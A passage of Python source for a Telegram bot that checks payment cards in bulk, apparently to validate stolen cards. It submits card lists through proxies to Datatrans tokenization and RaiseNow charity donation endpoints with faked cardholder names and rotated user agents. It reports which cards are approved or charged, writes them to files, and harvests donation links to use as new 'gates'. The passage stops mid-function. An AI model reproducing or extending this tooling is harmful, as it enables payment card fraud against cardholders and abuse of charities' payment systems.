                    except telegram.error.BadRequest as e:
                        if "Message is not modified" not in str(e): logger.warning(f"Error updating /multi progress: {e}")
                        pass
                    except Exception as e:
                        logger.error(f"Unknown error updating /multi progress: {e}")
                    last_update_time = time.time()
                
        duration = time.time() - start_time
        update_user_stats(user.id, user, counts)

        if stopped_due_to_http_error:
            await status_message.edit_text(
                f"üõë **CHECK STOPPED - TOO MANY HTTP ERRORS** üõë\n\n"
                f"**Reason:** The tool was stopped because more than 10 cards failed with a persistent HTTP connection error while using proxies.\n"
                f"This usually indicates a network problem or an issue with the payment gateway.\n\n"
                f"**Processed before stop:** `{processed_count}/{total_lines}`",
                reply_markup=None
            )
            return

        if gate_died_flag:
            await status_message.edit_text(
                f"üõë **CHECK STOPPED - GATE DIED** üõë\n\n"
                f"**Reason:** The gate is down (`Forbidden` error).\n"
                f"The process was stopped immediately.\n\n"
                f"**Gate Used:** `{gate_name}`\n"
                f"**Failing Card:** `{gate_fail_card}`\n\n"
                f"**Processed before stop:** `{processed_count}/{total_lines}`",
                reply_markup=None
            )
            return

        if cancel_event.is_set():
            await status_message.edit_text(f"üõë **Task has been stopped by request.**\n\nProcessed: {processed_count}/{total_lines} cards.", reply_markup=None)
            return

        final_header = [
            f"**üìä Check Complete!**\n",
            f"**Gate Used:** `{gate_name}`",
            f"**Total Cards:** `{total_lines}`",
            f"**Time Taken:** `{duration:.2f}s`\n",
        ]

        final_counts = []
        
        mode_check_map = {
            '1': get_gate1_mode, '2': get_gate2_mode, '3': get_gate3_mode, '5': get_gate5_mode,
            '8': get_gate8_mode, '9': get_gate9_mode, '10': get_gate10_mode, '11': get_gate11_mode,
            '12': get_gate12_mode, 'special': get_multi_link_mode
        }
        is_charge_gate = (
            active_gate in ['4', '6'] or
            (active_gate in mode_check_map and mode_check_map[active_gate]() == 'charge')
        )
        if is_charge_gate:
            final_counts.append(f"‚úÖ **Charged:** `{counts['success']}`")
        
        final_counts.extend([
            f"‚úÖ **Approved:** `{counts['live_success']}`",
            f"‚ùå **Declined:** `{counts['decline']}`",
            f"üîí **3D Secure:** `{counts['custom']}`",
            f"üìã **Invalid Format:** `{counts['invalid_format']}`",
            f"‚ùóÔ∏è **Errors:** `{counts['error']}`\n",
            f"-----------------------------------------"
        ])

        final_message = final_header + final_counts
        
        if results['live_success']: final_message.extend(("\n**‚úÖ APPROVED:**", *results['live_success']))
        if results['success'] and is_charge_gate: final_message.extend(("\n**‚úÖ CHARGED CARDS:**", *results['success']))
        if results['custom']: final_message.extend(("\n**üîí 3D SECURE CARDS:**", *results['custom']))
        if results['decline']: final_message.extend(("\n**‚ùå DECLINED CARDS:**", *results['decline']))
        if results['invalid_format']: final_message.extend(("\n**üìã INVALID FORMAT:**", *results['invalid_format']))
        if results['error']: final_message.extend(("\n**‚ùóÔ∏è ERRORS:**", *results['error']))
        if results['unknown']: final_message.extend(("\n**‚ùî UNKNOWN:**", *results['unknown']))

        final_text = "\n".join(final_message)
        
        # --- NEW: Save multi check results to user's log folder ---
        session_timestamp = datetime.now(VIETNAM_TZ).strftime("%Y%m%d-%H%M%S")
        session_dir = os.path.join(LOG_DIR, str(user.id), f"multi_{session_timestamp}")
        os.makedirs(session_dir, exist_ok=True)
        result_file_path = os.path.join(session_dir, "multi_results.txt")
        with open(result_file_path, "w", encoding="utf-8") as f:
            f.write(final_text)

        if len(final_text) > 4096:
            await status_message.edit_text("Result is too long to display. Sending as a file.", reply_markup=None)
            with open(result_file_path, 'rb') as file_to_send:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=file_to_send)
        else:
            await status_message.edit_text(final_text, reply_markup=None)

    except Exception as e:
        logger.error(f"Error in /multi: {e}", exc_info=True)
        await status_message.edit_text(f"‚õîÔ∏è **Critical Error!**\n```\n{str(e).replace('`', '')}\n```", reply_markup=None)
    finally:
        ACTIVE_CHECKS.pop(user.id, None)
        CANCELLATION_EVENTS.pop(user.id, None)

async def multi_check_command(update, context):
    """(Tasked) Checks multiple cards in one message."""
    asyncio.create_task(_multi_check_worker(update, context))

async def _mass_check_worker(update, context):
    """Worker function for the /mass command."""
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"You are not authorized to use this command. Please contact the Admin: {ADMIN_USERNAME}")
        return
        
    if user.id != ADMIN_ID and not is_bot_on():
        await update.message.reply_text(MESSAGES["bot_off"])
        return
    
    if user.id in ACTIVE_CHECKS:
        logger.warning(f"User {user.id} ({user.full_name}) tried to spam /mass.")
        await update.message.reply_text("You already have another check task running. Please wait for it to complete or use /stop.", quote=True)
        return 

    if not update.message.document: await update.message.reply_text("Please attach a .txt file."); return
    document = update.message.document
    if not document.file_name.lower().endswith('.txt'): await update.message.reply_text("Only .txt files are accepted."); return
    
    file = await context.bot.get_file(document.file_id)
    file_content = (await file.download_as_bytearray()).decode('utf-8')
    lines = [line for line in file_content.splitlines() if line.strip()]
    total_lines = len(lines)

    if not lines: await update.message.reply_text("üìÇ The file is empty."); return
    
    if user.id != ADMIN_ID:
        user_limit = get_user_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(
                f"‚õîÔ∏è **Limit Exceeded!**\n\n"
                f"Your file has `{total_lines}` lines, but your limit is `{user_limit}` lines.\n\n"
                f"Please contact admin {ADMIN_USERNAME} to increase your limit."
            )
            return

    caption = update.message.caption or "/mass"
    
    requested_threads_match = re.match(r'/mass(\d+)', caption)
    requested_threads = int(requested_threads_match.group(1)) if requested_threads_match and requested_threads_match.group(1) else 10

    if user.id != ADMIN_ID:
        num_threads = min(requested_threads, MEMBER_THREAD_LIMIT)
        if requested_threads > MEMBER_THREAD_LIMIT:
            await update.message.reply_text(
                f"‚ö†Ô∏è **Thread Limit!** Members can use a maximum of {MEMBER_THREAD_LIMIT} threads. Automatically adjusted.",
                quote=True
            )
    else:
        num_threads = requested_threads

    num_threads = max(1, num_threads)

    active_gate = get_active_gate()
    gate_name = get_formatted_gate_name(active_gate)

    session_timestamp = datetime.now(VIETNAM_TZ).strftime("%Y%m%d-%H%M%S")
    session_dir = os.path.join(LOG_DIR, str(user.id), session_timestamp)
    os.makedirs(session_dir, exist_ok=True)
    
    keyboard = [[InlineKeyboardButton("üõë Stop My Task", callback_data=f"stop_mytask_{user.id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    status_message = await update.message.reply_text(f"‚è≥ Initializing... Preparing to check `{total_lines}` cards with `{num_threads}` threads via **{gate_name}**.", reply_markup=reply_markup)
    start_time = time.time()
    
    cancel_event = threading.Event()
    loop = asyncio.get_running_loop()
    try:
        ACTIVE_CHECKS[user.id] = {
            "full_name": user.full_name,
            "username": user.username,
            "start_time": time.time(),
            "task_type": "mass"
        }
        CANCELLATION_EVENTS[user.id] = cancel_event

        counts = {'success': 0, 'live_success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0, 'gate_dead': 0}
        result_lists = {k: [] for k in counts.keys()}
        result_lists['error_debug'] = []
        processed_count = 0
        last_update_time = time.time()
        gate_died_flag = False
        stopped_due_to_http_error = False
        persistent_http_error_count = 0
        gate_fail_card = ""

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card_with_retry, line, cancel_event): line for line in lines}
            for future in as_completed(future_to_line):
                if cancel_event.is_set():
                    break

                processed_count += 1
                try:
                    status, original_line, full_response, bin_info, had_persistent_error = future.result()
                    
                    if status in ['error', 'unknown']:
                        debug_info = f"Card: {original_line}\nResponse: {str(full_response)[:3500]}"
                        result_lists['error_debug'].append(debug_info)
                        if user.id != ADMIN_ID:
                            coro = context.bot.send_message(chat_id=ADMIN_ID, text=f"üêû DEBUG ALERT (user {user.id}):\n{debug_info}")
                            asyncio.run_coroutine_threadsafe(coro, loop)
                
                    if had_persistent_error:
                        persistent_http_error_count += 1
                        result_lists['error'].append(f"{original_line} | Persistent HTTP error: {full_response}")
                        proxy_config = load_proxies()
                        if proxy_config.get("enabled") and persistent_http_error_count > 10:
                            logger.error("Stopping /mass task due to too many persistent HTTP errors.")
                            stopped_due_to_http_error = True
                            cancel_event.set()
                        continue

                    if status == 'gate_dead':
                        counts['gate_dead'] += 1
                        gate_fail_card = original_line
                        gate_died_flag = True
                        cancel_event.set()
                        result_lists['error'].append(f"{original_line} | GATE DIED ({full_response})")
                        continue
                    
                    counts[status] = counts.get(status, 0) + 1
                    
                    brand = (bin_info.get('brand') or 'N/A').upper()
                    card_type = (bin_info.get('type') or 'N/A').upper()
                    level = (bin_info.get('level') or 'N/A').upper()
                    bank = (bin_info.get('bank') or 'N/A')
                    country_name = (bin_info.get('country_name') or 'N/A').upper()
                    bin_parts = [p for p in [bank, brand, card_type, level, country_name] if p and p != 'N/A']
                    bin_str_details = " - ".join(bin_parts)

                    line_to_save = ""
                    decline_msgs = {
                        'VIETNAM_BIN_DECLINE': 'DECLINED (VN BIN)',
                        'INVALID_BIN_DECLINE': 'DECLINED (Invalid BIN)',
                        'EXPIRED_CARD_DECLINE': 'DECLINED (Expired)',
                        'INVALID_CARDNUMBER_DECLINE': 'DECLINED (Invalid Card Number)',
                        'CARD_NOT_ALLOWED_DECLINE': 'DECLINED (Not Supported)'
                    }
                    if status == 'decline':
                        decline_msg = decline_msgs.get(full_response, 'DECLINED')
                        line_to_save = f"{original_line} | {decline_msg}"
                    elif status == 'live_success':
                        line_to_save = f"{original_line} | APPROVED‚úÖ | {bin_str_details}"
                    elif status == 'success':
                        try:
                            amount_charged_raw = int(full_response.split('_')[1])
                            amount_in_usd = amount_charged_raw / 100.0
                            charge_msg = f"| Charge {amount_in_usd:.2f}$ successfull"
                        except (ValueError, IndexError):
                            charge_msg = "| Charged Successfully"
                        line_to_save = f"{original_line} {charge_msg} | {bin_str_details}"
                    elif status == 'invalid_format': line_to_save = f"{original_line} | Reason: {full_response}"
                    elif status == 'cancelled': continue
                    elif status == 'error' and had_persistent_error: continue
                    else:
                        if status == 'unknown':
                            line_to_save = f"{original_line} | Unknown"
                        else: # For 'custom' and other non-persistent errors
                            line_to_save = f"{original_line} | {bin_str_details}"
                    
                    if line_to_save: result_lists[status].append(line_to_save)

                except Exception as e:
                    original_line = future_to_line[future]
                    logger.error(f"Error processing future for card {original_line} in /mass: {e}", exc_info=True)
                    counts['error'] += 1
                    result_lists['error'].append(f"{original_line} | Processing error: {e}")

                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    
                    cpu_usage = psutil.cpu_percent()
                    ram_usage = psutil.virtual_memory().percent
                    
                    status_lines = [
                        f"**üöÄ Checking in progress...**\n{progress_bar}\n",
                        f"üíª **CPU:** `{cpu_usage}%` | **RAM:** `{ram_usage}%`",
                        f"**Gate:** `{gate_name}` | **Threads:** `{num_threads}`",
                        f"**Progress:** `{processed_count}/{total_lines}`\n"
                    ]

                    mode_check_map = {
                        '1': get_gate1_mode, '2': get_gate2_mode, '3': get_gate3_mode, '5': get_gate5_mode,
                        '8': get_gate8_mode, '9': get_gate9_mode, '10': get_gate10_mode, '11': get_gate11_mode,
                        '12': get_gate12_mode, 'special': get_multi_link_mode
                    }
                    is_charge_gate = (
                        active_gate in ['4', '6'] or
                        (active_gate in mode_check_map and mode_check_map[active_gate]() == 'charge')
                    )

                    if is_charge_gate:
                        status_lines.append(f"‚úÖ **Charged:** `{counts['success']}`")
                    
                    status_lines.extend([
                        f"‚úÖ **Approved:** `{counts['live_success']}`",
                        f"‚ùå **Declined:** `{counts['decline']}`",
                        f"üîí **3D Secure:** `{counts['custom']}`",
                        f"üìã **Invalid Format:** `{counts['invalid_format']}`",
                        f"‚ùî **Errors:** `{counts['error']}`"
                    ])
                    status_text = "\n".join(status_lines)

                    try: 
                        current_reply_markup = reply_markup if not cancel_event.is_set() else None
                        await status_message.edit_text(text=status_text, reply_markup=current_reply_markup)
                    except telegram.error.BadRequest as e:
                        if "Message is not modified" not in str(e): logger.warning(f"Error updating /mass progress: {e}")
                        pass
                    except Exception as e:
                        logger.error(f"Unknown error updating /mass progress: {e}")
                    last_update_time = time.time()
                
        duration = time.time() - start_time
        
        counts['cancelled'] = total_lines - processed_count

        if stopped_due_to_http_error:
            final_summary_text = (
                f"üõë **CHECK STOPPED - TOO MANY HTTP ERRORS** üõë\n\n"
                f"**Reason:** The tool was stopped because more than 10 cards failed with a persistent HTTP connection error while using proxies.\n\n"
                f"**Gate Used:** `{gate_name}`\n"
                f"**Processed before stop:** `{processed_count}/{total_lines}`\n\n"
                f"The processed results will be sent."
            )
        elif gate_died_flag:
            final_summary_text = (
                f"üõë **CHECK STOPPED - GATE DIED** üõë\n\n"
                f"**Reason:** The gate is down (`Forbidden` error).\n"
                f"The process was stopped immediately.\n\n"
                f"**Gate Used:** `{gate_name}`\n"
                f"**Failing Card:** `{gate_fail_card}`\n"
                f"**Processed before stop:** `{processed_count}/{total_lines}`\n\n"
                f"The processed results will be sent."
            )
        elif cancel_event.is_set():
            final_summary_text = (
                f"üõë **Task has been stopped by request.**\n\n"
                f"Processed: {processed_count}/{total_lines} cards. The processed results will be sent."
            )
        else:
            summary_lines = [
                f"**üìä Check Complete!**\n",
                f"**Gate Used:** `{gate_name}`",
                f"**Total:** `{total_lines}` | **Threads:** `{num_threads}`\n"
            ]
            
            mode_check_map = {
                '1': get_gate1_mode, '2': get_gate2_mode, '3': get_gate3_mode, '5': get_gate5_mode,
                '8': get_gate8_mode, '9': get_gate9_mode, '10': get_gate10_mode, '11': get_gate11_mode,
                '12': get_gate12_mode, 'special': get_multi_link_mode
            }
            is_charge_gate = (
                active_gate in ['4', '6'] or
                (active_gate in mode_check_map and mode_check_map[active_gate]() == 'charge')
            )
            
            if is_charge_gate:
                summary_lines.append(f"‚úÖ **Charged:** `{counts['success']}`")
            
            summary_lines.extend([
                f"‚úÖ **Approved:** `{counts['live_success']}`",
                f"‚ùå **Declined:** `{counts['decline']}`",
                f"üîí **3D Secure:** `{counts['custom']}`",
                f"üìã **Invalid Format:** `{counts['invalid_format']}`",
                f"‚ùî **Errors:** `{counts['error']}`",
                f"üõë **Cancelled:** `{counts['cancelled']}`\n",
                f"**‚è±Ô∏è Took:** `{duration:.2f}s`"
            ])
            final_summary_text = "\n".join(summary_lines)
        
        await status_message.edit_text(final_summary_text, reply_markup=None)

        summary_data = {'counts': counts, 'original_filename': document.file_name}
        save_json_file(os.path.join(session_dir, "summary.json"), summary_data)
        
        update_user_stats(user.id, user, counts)

        file_map = {
            'success': 'charged.txt', 'live_success': 'approved.txt', 'decline': 'declined.txt',
            'custom': '3d_secure.txt', 'invalid_format': 'invalid_format.txt',
            'error': 'errors.txt', 'unknown': 'unknown.txt'
        }
        for status, filename in file_map.items():
            if result_lists[status]:
                file_path = os.path.join(session_dir, filename)
                with open(file_path, 'w', encoding='utf-8') as f: f.write("\n".join(result_lists[status]))
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=update.effective_chat.id, document=doc)

        if user.id == ADMIN_ID and result_lists['error_debug']:
            debug_path = os.path.join(session_dir, "debug_admin.txt")
            with open(debug_path, 'w', encoding='utf-8') as f: f.write("\n\n---\n\n".join(result_lists['error_debug']))
            with open(debug_path, 'rb') as doc: await context.bot.send_document(chat_id=ADMIN_ID, document=doc)

    except Exception as e:
        logger.error(f"Error in mass_check: {e}", exc_info=True)
        await status_message.edit_text(f"‚õîÔ∏è **Critical Error!**\n```\n{str(e).replace('`', '')}\n```", reply_markup=None)
    finally:
        ACTIVE_CHECKS.pop(user.id, None)
        CANCELLATION_EVENTS.pop(user.id, None)

async def mass_check_handler(update, context):
    """(Tasked) Checks a list of cards from a .txt file."""
    asyncio.create_task(_mass_check_worker(update, context))

# --- STOP TASK COMMAND ---
async def _stop_command_worker(update, context):
    """Worker function for the /stop command."""
    user = update.effective_user
    target_user_id = user.id

    if user.id == ADMIN_ID and context.args:
        try: target_user_id = int(context.args[0])
        except (ValueError, IndexError):
            await update.message.reply_text("‚ùå Invalid User ID. Usage: `/stop <user_id>`"); return
    elif user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text("You do not have permission to use this command."); return

    if target_user_id in CANCELLATION_EVENTS:
        CANCELLATION_EVENTS[target_user_id].set()
        if target_user_id == user.id:
            await update.message.reply_text("‚è≥ Stop request sent. The task will stop after finishing the currently checking cards...")
        else:
            await update.message.reply_text(f"‚è≥ Sent request to stop the task of user `{target_user_id}`.")
    else:
        if target_user_id == user.id:
            await update.message.reply_text("‚ÑπÔ∏è You have no running /mass or /multi tasks.")
        else:
            await update.message.reply_text(f"‚ÑπÔ∏è User `{target_user_id}` has no running tasks.")

async def stop_command(update, context):
    """(Tasked) Stops a user's currently running /mass or /multi task."""
    asyncio.create_task(_stop_command_worker(update, context))

# --- MANAGEMENT & NOTIFICATION COMMANDS ---

async def active_checks_command(update, context):
    """(Admin) Shows currently running tasks with stop buttons."""
    if update.effective_user.id != ADMIN_ID: return

    if not ACTIVE_CHECKS:
        await update.message.reply_text("‚úÖ There are no check tasks currently running.")
        return

    message = "üèÉ‚Äç‚ôÇÔ∏è **Active Tasks:**\n\n"
    now = time.time()
    
    keyboard = []
    active_checks_copy = dict(ACTIVE_CHECKS)

    for user_id, data in active_checks_copy.items():
        duration = now - data.get('start_time', now)
        username = f"@{data.get('username')}" if data.get('username') else "N/A"
        full_name = data.get('full_name', 'N/A')
        task_type = data.get('task_type', 'N/A').upper()
        
        message += (f"üë§ **User:** {full_name} ({username}) | ID: `{user_id}`\n"
                    f"   - **Command:** `/{task_type}`\n"
                    f"   - **Runtime:** `{int(duration)}` seconds\n"
                    f"--------------------\n")
        
        keyboard.append([InlineKeyboardButton(f"üõë Stop {full_name}'s Task", callback_data=f"stop_task_{user_id}")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup)

def _perform_gate_check(gate_id: str, card_line: str):
    """
    Helper function to perform a detailed check on a specific gate for the /status command.
    Returns: (overall_status, transaction_id_info, second_request_response)
    """
    cc, mes, ano, cvv = card_line.split('|')
    ano_full = f"20{ano}"
    session = requests.Session()

    proxy_config = load_proxies()
    if proxy_config.get("enabled") and proxy_config.get("proxies"):
        try:
            proxy_str = random.choice(proxy_config["proxies"])
            proxy_dict = _format_proxy_for_requests(proxy_str)
            if proxy_dict:
                session.proxies = proxy_dict
                logger.info(f"Status check for Gate {gate_id} using proxy.")
        except IndexError:
            logger.warning("Proxy enabled but list is empty for status check.")

    user_agent = random_user_agent()
    transaction_id = None
    transaction_id_info = "Not attempted."
    second_request_response = "Not attempted."
    overall_status = "Unknown ‚ùì"

    random_form_part_12 = ''.join(random.choices(string.digits, k=12))
    form_id_12 = f"2508080{random_form_part_12}"

    gate_configs = {
        '1': {'formId': "250806042656273071", 'merchantId': "3000022877"}, '2': {'formId': "250806055626003241", 'merchantId': "3000022877"},
        '3': {'formId': "250807082606088731", 'merchantId': "3000022877"}, '4': {'formId': "250807155854598300", 'merchantId': "3000022877"},
        '5': {'formId': "250807181638869139", 'merchantId': "3000022877"}, '6': {'formId': "250802205541759546", 'merchantId': "3000022877"},
        '7': {'formId': "250802162822879268", 'merchantId': "3000022877"}, '8': {'formId': "250804202812044270", 'merchantId': "3000022877"},
        '9': {'formId': "250805043713003023", 'merchantId': "3000022877"}, '10': {'formId': "250807190400178471", 'merchantId': "3000022877"},
        '11': {'formId': "250808040558588645", 'merchantId': "3000022877"}, '12': {'formId': form_id_12, 'merchantId': "3000022877"}
    }
    
    config = gate_configs.get(gate_id)
    
    if not config:
        return "Unknown ‚ùì", f"Gate {gate_id} not configured", "N/A"

    try:
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = {
            "mode": "TOKENIZE", "formId": config['formId'], "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA",
            "merchantId": config['merchantId'], "browserUserAgent": user_agent, "browserJavaEnabled": "false",
            "browserLanguage": "en-US", "browserColorDepth": "24", "browserScreenHeight": "1152",
            "browserScreenWidth": "2048", "browserTZ": "-420"
        }
        tokenize_headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com", "X-Requested-With": "XMLHttpRequest", "User-Agent": user_agent}
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, max_retries=2)

        if error: transaction_id_info = f"Error: {error}"
        elif not token_response: transaction_id_info = "HTTP Error with no response"
        else:
            try:
                token_data = token_response.json()
                transaction_id = token_data.get("transactionId")
                if transaction_id: transaction_id_info = transaction_id
                else: transaction_id_info = f"Failed. Response: {token_response.text}"
            except json.JSONDecodeError: transaction_id_info = f"Failed. Non-JSON response: {token_response.text}"
    except Exception as e:
        transaction_id_info = f"System Error: {e}"
        return "Check Error üî¥", transaction_id_info, "Skipped due to Tokenization failure."

    if not transaction_id:
        return "Offline üî¥", transaction_id_info, "Skipped due to Tokenization failure."

    try:
        random_first_name, random_last_name = generate_random_string(10), generate_random_string(12)
        random_cardholder = f"{random_first_name} {random_last_name}"
        payment_payload, payment_url = {}, ""

        gate_payloads = {
            '1': lambda: (get_gate1_mode(), {"account_uuid": "01bd7c99-eefc-42d2-91e4-4a020f6b5cfc", "supporter": {"locale": "en", "first_name": random_first_name, "last_name": random_last_name, "email": random_email(), "birth_day": random_birth_day(), "birth_month": random_birth_month(), "birth_year": random_birth_year()}, "raisenow_parameters": {"solution": {"uuid": "75405349-f0b9-4bed-9d28-df297347f272"}, "product": {"source_url": "https://donate.raisenow.io/ynddy?lng=en"}}, "profile": "110885c2-a1e8-47b7-a2af-525ad6ab8ca6", "return_url": "https://donate.raisenow.io/ynddy?lng=en&rnw-view=payment_result", "subscription": {"recurring_interval": "6 * *", "timezone": "Asia/Bangkok"}}),
            '2': lambda: (get_gate2_mode(), {"account_uuid": "14bd66de-7d3a-4d31-98cd-072193050b5f", "supporter": {"locale": "de", "first_name": random_first_name, "last_name": random_last_name}, "raisenow_parameters": {"solution": {"uuid": "0a3ee5eb-f169-403a-b4b8-b8641fe2a07d"}, "product": {"source_url": "https://donate.raisenow.io/bchqm?lng=de"}}, "profile": "30b982d3-d984-4ed7-bd0d-c23197edfd1c", "return_url": "https://donate.raisenow.io/bchqm?lng=de&rnw-view=payment_result"}),
            # Add other gates here if they have a simple structure
        }

        if gate_id in gate_payloads:
            mode, partial_payload = gate_payloads[gate_id]()
            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
            
            payment_payload = {
                "test_mode": False, "create_supporter": False, "amount": {"currency": "EUR", "value": 50},
                "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes.zfill(2), "expiry_year": ano_full, "transaction_id": transaction_id},
                **partial_payload
            }
        else: # Fallback for complex payloads not refactored
            return "Check N/A üü°", "This gate status check is not fully implemented.", "N/A"

        payment_headers = {"Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": user_agent}
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, max_retries=2)

        if error:
            second_request_response = f"Error: {error}"
            overall_status = "Check Error üî¥"
        elif not payment_response:
            second_request_response = "HTTP Error with no response"
            overall_status = "Offline üî¥"
        else:
            second_request_response = payment_response.text
            if '{"message":"Forbidden"}' in second_request_response: overall_status = "Offline üî¥"
            else: overall_status = "Active üü¢"
    except Exception as e:
        second_request_response = f"System Error: {e}"
        overall_status = "Check Error üî¥"

    return overall_status, transaction_id_info, second_request_response


async def _status_command_worker(update, context):
    """Worker function for the /status command."""
    if update.effective_user.id != ADMIN_ID: return
    
    msg = await update.message.reply_text("‚è≥ Checking gate statuses... This may not test all gates completely. Use individual gate commands for full details.")
    
    test_card = "4170331140410379|4|28|766"

    gate_ids = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12']
    
    with ThreadPoolExecutor(max_workers=len(gate_ids)) as executor:
        future_to_gate = {executor.submit(_perform_gate_check, gid, test_card): gid for gid in gate_ids}
        results = {}
        for future in as_completed(future_to_gate):
            gid = future_to_gate[future]
            try:
                status, transaction_id_info, response = future.result()
                results[gid] = (status, transaction_id_info, response)
            except Exception as e:
                results[gid] = ("Check Error üî¥", "N/A", str(e))

    final_message = "üìä **PAYMENT GATEWAY STATUS** üìä\n\n"
    for gid in sorted(results.keys(), key=lambda x: int(x)):
        status, transaction_id_info, response = results.get(gid, ("Unknown", "N/A", "No result"))
        
        try:
            parsed_json = json.loads(response)
            response_display = json.dumps(parsed_json, indent=2)
        except (json.JSONDecodeError, TypeError):
            response_display = str(response)

        response_display = response_display[:1000] # Truncate long responses
        
        gate_name_full = get_formatted_gate_name(gid)

        final_message += (
            f"**{gate_name_full}**\n"
            f"**Status:** {status}\n"
            f"**Request 1 (Tokenize):** `transactionId: {transaction_id_info}`\n"
            f"**Request 2 Response:**\n```json\n{response_display}\n```\n"
            f"----------------------------------------\n"
        )

    await msg.edit_text(final_message)

async def status_command(update, context):
    """(Tasked) Checks the operational status of the payment gateways."""
    asyncio.create_task(_status_command_worker(update, context))


async def gate_command(update, context):
    """Command to change the check gate (Admin only)."""
    if update.effective_user.id != ADMIN_ID: return
    
    if not context.args:
        current_gate = get_active_gate()
        current_gate_name = get_formatted_gate_name(current_gate)
        await update.message.reply_text(f"‚ÑπÔ∏è Current active gate: **{current_gate_name}**.\n\nUse `/gate [1-12]` or `/dalink` to change.")
        return
        
    new_gate = context.args[0]
    gate_mode_map = {
        '1': ("setgate1mode", "Gate 1"), '2': ("setgate2mode", "Gate 2"),
        '3': ("setgate3mode", "Gate 3"), '5': ("setgate5mode", "Gate 5"),
        '8': ("setgate8mode", "Gate 8"), '9': ("setgate9mode", "Gate 9"),
        '10': ("setgate10mode", "Gate 10"), '11': ("setgate11mode", "Gate 11"),
        '12': ("setgate12mode", "Gate 12")
    }
    
    if new_gate in gate_mode_map:
        callback_prefix, gate_name_text = gate_mode_map[new_gate]
        keyboard = [[
            InlineKeyboardButton("üí∞ Charge", callback_data=f"{callback_prefix}_charge"),
            InlineKeyboardButton("‚ö° Check Live", callback_data=f"{callback_prefix}_live"),
        ]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"Please select a mode for **{gate_name_text}**:",
            reply_markup=reply_markup
        )
    elif new_gate in ['4', '6', '7']:
        set_active_gate(new_gate)
        new_gate_name = get_formatted_gate_name(new_gate)
        await update.message.reply_text(f"‚úÖ Switched payment gate to: **{new_gate_name}**")
    else:
        await update.message.reply_text("‚ùå Invalid gate. Please choose from `1-12` or use `/dalink`.")


# --- NEW: SPECIAL MULTI-LINK COMMANDS ---
async def dalink_command(update, context):
    """(Admin) Activates the special multi-link checking mode."""
    if update.effective_user.id != ADMIN_ID: return

    keyboard = [[
        InlineKeyboardButton("üí∞ Charge", callback_data="setmultilinkmode_charge"),
        InlineKeyboardButton("‚ö° Check Live", callback_data="setmultilinkmode_live"),
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Please select a mode for the **Special Multi-Link Gate**:",
        reply_markup=reply_markup
    )

def _validate_and_save_link_worker(url: str, session: requests.Session):
    """Worker function to test and process a single link."""
    try:
        parsed_url = urlparse(url)
        cd = parsed_url.path.strip('/')
        if not cd:
            return f"‚ùå Invalid URL: `{url}`"

        # 1. Get initial data
        api_url = f"https://api.raisenow.io/short-identifiers/{cd}"
        response, error = make_request_with_retry(session, 'get', api_url, timeout=10)
        
        if error or not response:
            return f"‚ùå Failed to fetch data for `{cd}`. Error: {error or 'No response'}"
        
        if response.status_code != 200:
             return f"‚ùå Failed to fetch data for `{cd}`. Status: {response.status_code}"

        data = response.json()
        if data.get("method_name") != "card":
            return f"üü° Link `{cd}` does not support card payments."
        
        account_uuid = data.get("account_uuid")
        solution_uuid = data.get("solution_uuid")
        profile = data.get("profile")

        if not all([account_uuid, solution_uuid, profile]):
            return f"‚ùå Missing required data (uuid, profile) for `{cd}`."

        # 2. Perform a test check (we expect it to fail with a decline)
        test_card = "4170331140410379|12|29|123" # Known test card that usually gets declined
        cc, mes, ano, cvv = test_card.split('|')
        
        # We only need to test one mode (e.g., live) to see if payload is accepted
        status, _, full_response, _ = check_card_multi_link(
            session, test_card, cc, mes, ano, cvv, {}, None, 
            get_mode_func=lambda: 'live', # test live mode
            _get_charge_value=lambda _, __: 50, # dummy function
            custom_charge_amount=None
        )

        if status == 'decline':
            # This is the expected outcome for a valid link with a test card
            saved_links = load_multi_links()
            if any(link.get('cd') == cd for link in saved_links):
                return f"‚ÑπÔ∏è Link `{cd}` is already saved and seems to be working."
            
            link_data = {
                "url": url, "cd": cd, "account_uuid": account_uuid,
                "solution_uuid": solution_uuid, "profile": profile
            }
            saved_links.append(link_data)
            save_multi_links(saved_links)
            return f"‚úÖ **Link OK:** `{cd}` was successfully added."
        elif status == 'error' or status == 'gate_dead':
             return f"‚ùå **Link Invalid Payload:** `{cd}`. The server rejected the request. Response: `{str(full_response)[:200]}`"
        else:
             return f"üü° **Link Unknown Status:** `{cd}`. Status: `{status}`. Please check manually. It has been added anyway."

    except Exception as e:
        logger.error(f"Error validating link {url}: {e}", exc_info=True)
        return f"‚ùå **System Error** while validating `{url}`: `{e}`"


async def add_link_command(update, context):
    """(Admin) Adds one or more new donation links."""
    if update.effective_user.id != ADMIN_ID: return
    
    text_content = update.message.text.split('/addlink', 1)[-1].strip()
    if not text_content:
        await update.message.reply_text("Usage: `/addlink <url>` or `/addlink` with a list of URLs on new lines.")
        return

    urls = [line.strip() for line in text_content.splitlines() if line.strip().startswith("http")]
    if not urls:
